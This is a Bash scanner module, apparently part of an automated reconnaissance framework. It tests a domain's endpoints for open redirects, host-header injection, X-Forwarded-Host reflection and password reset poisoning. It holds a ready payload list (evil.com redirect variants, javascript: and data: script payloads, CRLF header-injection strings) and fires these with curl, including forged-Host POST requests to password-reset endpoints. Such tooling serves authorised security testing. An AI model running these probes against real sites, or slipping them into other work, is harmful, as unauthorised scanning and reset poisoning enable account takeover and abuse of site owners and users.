#!/bin/bash
# Open redirect and host-header injection testing, redirect chain analysis, password reset poisoning

redirect_injection_phase() {
    local domain="$1"
    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    local redir_dir="$output_dir/redirect_injection"
    local crawl_file="$output_dir/crawl/endpoints.txt"
    local params_file="$output_dir/crawl/urls_with_params.txt"

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true
    mkdir -p "$redir_dir"

    log "INFO" "Starting redirect/host-header injection testing for $domain"
    py_log "INFO" "redirect_injection_phase started" --phase "redirect_injection" --target "$domain" || true

    local redirect_vulns="$redir_dir/redirect_vulns.txt"
    local host_header_vulns="$redir_dir/host_header_vulns.txt"
    touch "$redirect_vulns" "$host_header_vulns"

    # ------------------------------------------------------------------
    # 1. Discover redirect-reflecting parameters
    # ------------------------------------------------------------------
    local redirect_params="$redir_dir/redirect_params.txt"
    if [ -f "$params_file" ] && command -v grep >/dev/null 2>&1; then
        log "INFO" "Discovering redirect parameters..."
        grep -iE "(redirect|url|uri|link|next|return|continue|dest|destination|goto|forward|rurl|dest_url|checkout_url|redir|redirect_url|redirect_uri|return_to|return_url|next_url)" "$params_file" 2>/dev/null \
            | sort -u > "$redirect_params" || true
    fi

    # ------------------------------------------------------------------
    # 2. Open redirect testing with payloads
    # ------------------------------------------------------------------
    if [ -f "$redirect_params" ] && [ -s "$redirect_params" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing open redirect vulnerabilities..."

        cat > "$redir_dir/redirect_payloads.txt" << 'REDIRECTPAYLOADS'
https://evil.com
//evil.com
/\evil.com
https://evil.com%2f%2e%2e
https://evil.com@target.com
https://evil.com%00.target.com
data:text/html,<script>alert(1)</script>
javascript:alert(1)
//evil.com%0d%0aLocation:%20https://evil.com
//evil%0d%0a.com
REDIRECTPAYLOADS

        while IFS= read -r target; do
            [ -z "$target" ] && continue
            while IFS= read -r payload; do
                [ -z "$payload" ] && continue
                # Replace redirect parameter value with payload
                local test_url
                test_url=$(echo "$target" | sed "s|\(redirect\|url\|uri\|link\|next\|return\|continue\|dest\|destination\|goto\|forward\|rurl\|dest_url\|checkout_url\|redir\|redirect_url\|redirect_uri\|return_to\|return_url\|next_url\)=[^&]*|\1=$(printf '%s' "$payload" | jq -sRr @uri 2>/dev/null)|" 2>/dev/null) || continue
                if [ "$test_url" = "$target" ]; then
                    continue
                fi

                local response
                response=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" --max-time 10 "$test_url" 2>/dev/null) || true
                local http_code
                http_code=$(echo "$response" | awk '{print $1}')
                local redirect_url
                redirect_url=$(echo "$response" | awk '{$1=""; print $0}' | tr -d ' ')

                if echo "$redirect_url" | grep -qiE "evil\.com"; then
                    echo "OPEN_REDIRECT: $test_url | Payload: $payload | Redirect: $redirect_url" >> "$redirect_vulns"
                    write_finding "{\"type\":\"open_redirect\",\"url\":\"$test_url\",\"payload\":\"$payload\",\"redirect\":\"$redirect_url\",\"severity\":\"high\",\"domain\":\"$domain\"}" "$redir_dir/findings.json" || true
                elif echo "$http_code" | grep -qE "^(301|302|303|307|308)$" && [ -n "$redirect_url" ]; then
                    echo "REDIRECT_CHAIN: $test_url -> $redirect_url | Code: $http_code" >> "$redirect_vulns"
                fi
            done < "$redir_dir/redirect_payloads.txt"
        done < <(head -30 "$redirect_params")
    fi

    # ------------------------------------------------------------------
    # 3. Redirect chain analysis
    # ------------------------------------------------------------------
    if [ -f "$redirect_params" ] && [ -s "$redirect_params" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Analyzing redirect chains..."
        while IFS= read -r target; do
            [ -z "$target" ] && continue
            local base_url="${target%%\?*}"
            local chain
            chain=$(curl -s -o /dev/null -w "%{redirect_url}" --max-time 10 -L --max-redirs 5 "$base_url" 2>/dev/null) || true
            if [ -n "$chain" ] && [ "$chain" != "$base_url" ]; then
                echo "REDIRECT_CHAIN: $base_url -> Final: $chain" >> "$redirect_vulns"
            fi
        done < <(head -30 "$redirect_params")
    fi

    # ------------------------------------------------------------------
    # 4. Host header injection
    # ------------------------------------------------------------------
    if [ -f "$params_file" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing host header injection..."
        local live_file="$output_dir/live/live_subdomains.txt"
        [ -f "$live_file" ] || true

        if [ -f "$live_file" ]; then
            while IFS= read -r host_url; do
                [ -z "$host_url" ] && continue
                # Test with evil Host header
                local evil_host="evil.com"
                local resp_headers
                resp_headers=$(curl -s -D - -o /dev/null --max-time 10 \
                    -H "Host: $evil_host" \
                    "$host_url" 2>/dev/null) || true

                if echo "$resp_headers" | grep -qiE "evil\.com"; then
                    echo "HOST_HEADER_INJECTION: $host_url | Evil host reflected in response headers" >> "$host_header_vulns"
                    write_finding "{\"type\":\"host_header_injection\",\"url\":\"$host_url\",\"severity\":\"high\",\"domain\":\"$domain\"}" "$redir_dir/findings.json" || true
                fi

                # Test Host header in password reset context
                local reset_endpoints
                reset_endpoints=$(grep -iE "(password|reset|forgot)" "$params_file" 2>/dev/null | head -5) || true
                while IFS= read -r reset_ep; do
                    [ -z "$reset_ep" ] && continue
                    local reset_code
                    reset_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
                        -H "Host: $evil_host" \
                        -X POST -d "email=test@test.com" \
                        "$reset_ep" 2>/dev/null) || true
                    if echo "$reset_code" | grep -qE "^(200|201|302)$"; then
                        echo "PASSWORD_RESET_POISONING: $reset_ep | Host: $evil_host | Status: $reset_code" >> "$host_header_vulns"
                        write_finding "{\"type\":\"password_reset_poisoning\",\"url\":\"$reset_ep\",\"severity\":\"critical\",\"domain\":\"$domain\"}" "$redir_dir/findings.json" || true
                    fi
                done < <(echo "$reset_endpoints")
            done < <(head -20 "$live_file")
        fi
    fi

    # ------------------------------------------------------------------
    # 5. X-Forwarded-Host bypass
    # ------------------------------------------------------------------
    if [ -f "$params_file" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing X-Forwarded-Host injection..."
        local live_file="$output_dir/live/live_subdomains.txt"
        if [ -f "$live_file" ]; then
            while IFS= read -r host_url; do
                [ -z "$host_url" ] && continue
                local resp
                resp=$(curl -s -D - -o /dev/null --max-time 10 \
                    -H "X-Forwarded-Host: evil.com" \
                    "$host_url" 2>/dev/null) || true
                if echo "$resp" | grep -qiE "evil\.com"; then
                    echo "XFORWARDED_HOST_INJECTION: $host_url" >> "$host_header_vulns"
                    write_finding "{\"type\":\"xforwarded_host_injection\",\"url\":\"$host_url\",\"severity\":\"medium\",\"domain\":\"$domain\"}" "$redir_dir/findings.json" || true
                fi
            done < <(head -20 "$live_file")
        fi
    fi

    # ------------------------------------------------------------------
    # 6. Summary count
    # ------------------------------------------------------------------
    local total_vulns
    total_vulns=$(( $(wc -l < "$redirect_vulns" 2>/dev/null || echo 0) \
                 + $(wc -l < "$host_header_vulns" 2>/dev/null || echo 0) ))
    log "INFO" "Redirect/host-header injection testing complete: $total_vulns issues found"

    py_log "INFO" "redirect_injection_phase complete" --phase "redirect_injection" --target "$domain" --extra "{\"vulns\":$total_vulns}" || true
    echo "$total_vulns" > "$redir_dir/count.txt"
}

export -f redirect_injection_phase
